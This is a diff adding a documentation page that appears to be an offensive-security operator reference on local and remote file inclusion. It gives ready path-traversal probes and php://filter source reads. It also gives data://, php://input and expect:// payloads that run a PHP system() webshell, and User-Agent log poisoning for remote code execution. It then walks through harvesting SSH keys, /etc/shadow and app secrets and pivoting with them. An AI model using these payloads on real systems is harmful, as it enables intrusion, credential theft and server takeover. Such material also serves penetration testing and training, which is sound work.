@@ -1,0 +1,158 @@
+---
+title: File Inclusion
+description: Operator reference for local and remote file inclusion attacks - path traversal, filter bypass, PHP wrappers, log poisoning, file-upload chains, RFI.
+mitre: [T1190, T1083, T1059]
+d3fend: [D3-EAL, D3-FA]
+impact: [FileRead, ServerSideEval, RCE]
+owasp: [A03, A05]
+noise: moderate
+sidebar:
+  order: 1
+  label: Overview
+---
+import { Aside } from '@astrojs/starlight/components';
+
+## TL;DR
+
+The application takes a path or filename from user input and feeds it to a file-loading function. Operator controls the path → operator reads files. If the loading function also executes the file's contents → operator gets RCE.
+
+```
+# Probe
+?page=../../../../etc/passwd                 # Linux path traversal
+?page=..\..\..\..\windows\win.ini            # Windows path traversal
+?page=/etc/passwd                            # absolute path, if function doesn't prefix
+
+# Read PHP source (function executes the file, can't read it directly)
+?page=php://filter/read=convert.base64-encode/resource=config
+
+# Get RCE - three common paths
+?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+&cmd=id
+?page=php://input + POST body: <?php system($_GET["cmd"]); ?> + ?cmd=id
+?page=expect://id                            # if expect module loaded
+
+# Log poisoning - when wrappers blocked
+User-Agent: <?php system($_GET["cmd"]); ?>   # in any request
+?page=/var/log/nginx/access.log&cmd=id       # then include the log
+```
+
+Success indicator: file contents, source code, or command output appearing in the response.
+
+## Where this lives
+
+Anywhere the application takes a filename or path from a request and uses it to load content:
+
+- **Templating parameters** - `?page=about`, `?lang=en`, `?view=profile`, `?theme=dark`
+- **File-download features** - `?file=invoice.pdf`, `?attachment=...`
+- **Avatar / image display** - `/profile/<user>/avatar.png` (often loads `<user>/avatar.png` from disk)
+- **Include-style operations** - anywhere the app stitches partial templates together at request time
+- **Configuration endpoints** - anything that loads "the configuration for X" by name
+- **Multi-language sites** - `/about/en`, `/about/es` patterns where the path segment selects a file
+
+Anything that smells like "the server is loading a file from disk based on what I sent."
+
+## Read vs Execute
+
+The single most important property of a file-inclusion sink is whether it just **reads** the file (returns contents) or **executes** it (interprets as code). This determines which attacks work.
+
+| Language | Function | Read | Execute | Remote URL |
+| --- | --- | --- | --- | --- |
+| PHP | `include()` / `include_once()` | yes | yes | yes |
+| PHP | `require()` / `require_once()` | yes | yes | no |
+| PHP | `file_get_contents()` | yes | no | yes |
+| PHP | `fopen()` / `file()` / `readfile()` | yes | no | no |
+| NodeJS | `fs.readFile()` / `fs.sendFile()` | yes | no | no |
+| NodeJS | `res.render()` (Express) | yes | yes | no |
+| Java | `<jsp:include>` | yes | no | no |
+| Java | `<c:import>` | yes | yes | yes |
+| .NET | `Response.WriteFile()` | yes | no | no |
+| .NET | `@Html.Partial()` | yes | no | no |
+| .NET | `@Html.RemotePartial()` | yes | no | yes |
+| .NET | `<!--#include-->` | yes | yes | yes |
+
+If the function executes the file, including a PHP/JSP/Razor file shows you the rendered output but **not** the source. Reading source code requires the [PHP filters](/codex/web/lfi/php-filters/) trick or equivalent.
+
+If the function only reads, including any file gives you its raw contents - easier to read source, harder to escalate to RCE (you can't just include a PHP file you uploaded).
+
+Remote URL support is the door to [RFI](/codex/web/lfi/rfi/).
+
+## Decision flow
+
+```
+1. Confirm LFI exists - can you read /etc/passwd or similar?
+                       │
+                       ├─ Yes → continue
+                       └─ No  → check basic bypasses (filter, encoding, traversal form)
+                                → see [Filter bypasses]
+                       │
+2. Does the function execute or only read?
+                       │
+                       ├─ Read only → focus on file disclosure
+                       │              → see [Basic LFI] and [PHP filters]
+                       │
+                       └─ Executes → can reach RCE; continue
+                       │
+3. Try PHP wrappers for direct RCE
+                       │
+                       ├─ data:// works   → done → see [Wrappers]
+                       ├─ php://input     → done
+                       └─ expect://       → done
+                       │
+4. Wrappers blocked - try a chain
+                       │
+                       ├─ App has file upload?       → [File-upload chain]
+                       ├─ App writes server logs you can read?  → [Log poisoning]
+                       ├─ Remote URL inclusion?      → [RFI]
+                       └─ PHP session file readable? → [Log poisoning § PHP sessions]
+```
+
+## Decision-flow page links
+
+1. **Read /etc/passwd as a first probe?** → [Basic LFI](/codex/web/lfi/basic-lfi/)
+2. **Path traversal blocked or filtered?** → [Filter bypasses](/codex/web/lfi/filter-bypasses/)
+3. **Function reads source - want PHP code?** → [PHP filters](/codex/web/lfi/php-filters/)
+4. **Function executes - go for RCE via wrappers** → [Wrappers](/codex/web/lfi/wrappers/)
+5. **Wrappers blocked, app has uploads?** → [File-upload chain](/codex/web/lfi/file-upload-chain/)
+6. **Wrappers blocked, can read server logs?** → [Log poisoning](/codex/web/lfi/log-poisoning/)
+7. **Function supports remote URLs?** → [RFI](/codex/web/lfi/rfi/)
+8. **Need to find parameters, webroot, log paths?** → [Enumeration](/codex/web/lfi/enumeration/)
+
+## Impact ladder
+
+| Tier | What you can do | Path |
+| --- | --- | --- |
+| 1 | Confirmed file read of public files (`/etc/passwd`, hosts file) | Basic path traversal |
+| 2 | Read application config - database passwords, API keys, session secrets | Read `/var/www/html/config.php` etc. |
+| 3 | Read source code via filter | `php://filter/convert.base64-encode/resource=...` |
+| 4 | Read SSH private keys, sudo creds, history files | Read `/root/.ssh/id_rsa`, `/home/*/.bash_history` |
+| 5 | RCE via wrapper | `data://`, `php://input`, `expect://` |
+| 6 | RCE via chain | File upload + LFI, log poisoning, RFI |
+
+Tiers 1-3 are nearly free on most vulnerable apps. Tier 4 frequently turns LFI into "compromise the box" without ever reaching RCE through the LFI itself - read SSH keys, log in over SSH, done. Tier 5-6 give RCE directly via the web application.
+
+## Operating notes
+
+**Read `/etc/passwd` as the first probe**, always. It's near-universally present on Linux, world-readable, and has a recognizable format. A failed probe is informative - tells you whether traversal works, whether the path is filtered, whether an extension is being appended.
+
+**Verbose errors are gold.** When LFI fails, the error message often shows the full path the function tried to load. That reveals the path prefix, the extension suffix, and whether traversal was sanitized. PHP errors like "failed to open stream: No such file or directory in /var/www/html/index.php" are giving you the webroot.
+
+**Don't forget Windows.** If the server is Windows, `/etc/passwd` doesn't exist - try `C:\Windows\System32\drivers\etc\hosts`, `C:\Windows\win.ini`, `C:\inetpub\wwwroot\web.config`. Path separators are flexible (forward slashes usually work even on Windows).
+
+**Check `allow_url_include` early.** It's the prerequisite for `data://`, `php://input`, and `http://`-based RFI. Reading `/etc/php/X.Y/apache2/php.ini` via [PHP filters](/codex/web/lfi/php-filters/) and grepping for `allow_url_include` tells you in one request whether the high-value wrapper paths are open.
+
+<Aside type="caution">
+LFI on production web applications routinely reaches `id_rsa`, database credentials, and full source code in a single GET request. The blast radius is much wider than the immediate file read suggests - once you have source code, you find more bugs offline; once you have credentials, you pivot to internal services. Confirm scope before going past the initial proof-of-concept read.
+</Aside>
+
+The [Basic LFI](/codex/web/lfi/basic-lfi/) page is the right starting point if you're new to a target. The wrapper and log-poisoning pages assume you've already confirmed LFI and are working toward RCE.
+
+## Next move
+
+- **`?file=../../../etc/passwd` returns passwd contents** → confirmed LFI; switch to [enumeration](/codex/web/lfi/enumeration/) to map readable files (configs, source, SSH keys, app secrets)
+- **Returns blank or 404** → try alternate path-traversal encodings (`%2e%2e%2f`, double encoding, null byte `%00` on PHP {'<5.3.4'}) - see [filter-bypasses](/codex/web/lfi/filter-bypasses/)
+- **Returns the file but PHP renders it (executes `<?php ... ?>`)** → use [php-filters](/codex/web/lfi/php-filters/) to base64-encode source on read - exposes original PHP source for offline review
+- **Read app source and found DB credentials / API keys** → try those credentials on the same host's other services (MSSQL/MySQL/SSH, [SMB](/codex/network/services/smb/), application admin login)
+- **Need RCE, not just read** → [log-poisoning](/codex/web/lfi/log-poisoning/) (write PHP into a log via User-Agent, then include the log) or [file-upload chain](/codex/web/lfi/file-upload-chain/) (upload a non-PHP file with PHP content, include it via LFI)
+- **`/proc/self/environ` readable** → environment variables often leak DB creds, API keys, debug toggles
+- **PHP wrappers available (`php://filter`, `php://input`, `data://`)** → [wrappers](/codex/web/lfi/wrappers/) - `data://text/plain,<?php system($_GET[c]); ?>` is sometimes a one-shot RCE
+- **Application includes remote URLs** → [RFI](/codex/web/lfi/rfi/) - host the payload on attacker-controlled server (faster than log poisoning when allowed)
+- **Got read access but no RCE path** → focus on credential hunting; LFI is enough to read `/etc/shadow` (if web user has access) or app secrets that pivot to other services
